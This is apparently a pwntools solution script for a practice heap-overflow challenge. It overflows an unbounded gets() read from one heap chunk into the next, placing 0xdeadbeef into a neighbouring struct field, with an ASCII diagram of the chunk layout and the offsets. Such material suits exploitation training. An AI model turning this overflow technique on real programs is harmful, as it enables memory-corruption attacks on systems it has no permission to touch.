from pwn import *

exe               = ELF ( './vuln' )
context.binary    = exe
context.log_level = 'info'

if args.REMOTE:
    io = remote( '127.0.0.1', 5000 )
else:
    io = process( exe.path )

"""
                                +------------------------+---+
                                | Size of chunk          | P |
ptr returned by malloc     -->  +------------------------+---+
                                | username     -> 20         |
                                | password     -> 20         |
                                |                            |
                                |  ... nulls ...             |
                                |                            |
                                +----------------------------+

next chunk ( Secret )      -->  +------------------------+---+
                                | Size of chunk          | P |
                                +------------------------+---+
                                | duck         -> 4          |
                                |                            |
                                |  ... nulls ...             |
                                |                            |
                                +----------------------------+

0x401335 <main+20>    call   malloc@plt                      <malloc@plt>
    size: 0x40
    --> allocates a chunk for User
    ptr [ rax ] -> 0x4052a0

0x401343 <main+34>    call   malloc@plt                      <malloc@plt>
    size: 0x40
    --> allocates a chunk for Secret
    ptr [ rax ] -> 0x4052f0

smash the heap at user->password to leak into Secret->duck
0x00000000004013a9 <+136>:   call   0x4010a0 <gets@plt>

walk down the chunk until the base of Secret->duck ;; overwrite with 0xdeadbeef
0x0000000000401402 <+225>:   cmp    eax,0xdeadbeef

^^ these addresses may be wrong if i decide to recompile after writing this, but offsets will never change
"""


base       = 0                         # ;; overflow starts from user->password, this will be 20 if we start from user->username                        
next_chunk = 40                        # ;; from end of User to start of Secret
duckduck   = 20                        # ;; from start of Secret to Secret->duck
offset = base + next_chunk + duckduck  # ;; user->password => Secret->duck

username  = b'duck'

password  = b'A' * offset              # ;; smash the heap
password += p64 ( 0xdeadbeef )         # ;; overwrite Secret->duck

io.sendline( username )

io.recvline()
io.sendline( password )

io.interactive()
